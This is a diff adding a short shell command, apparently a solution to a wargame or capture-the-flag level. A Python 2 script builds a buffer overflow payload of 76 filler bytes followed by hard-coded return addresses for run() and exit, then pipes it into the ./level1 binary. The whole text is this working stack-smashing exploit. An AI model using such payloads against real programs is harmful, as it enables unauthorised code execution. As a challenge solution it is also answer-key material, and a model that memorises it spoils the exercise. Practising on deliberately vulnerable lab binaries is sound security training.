@@ -1,0 +1,8 @@
+( python2 - <<'PY'
+import sys, struct
+payload = "A"*76
+payload += struct.pack("<I", 0x8048444)  # run()
+payload += struct.pack("<I", 0xb7e5ebe0)  # exit
+sys.stdout.write(payload + "\n")
+PY
+cat ) | ./level1
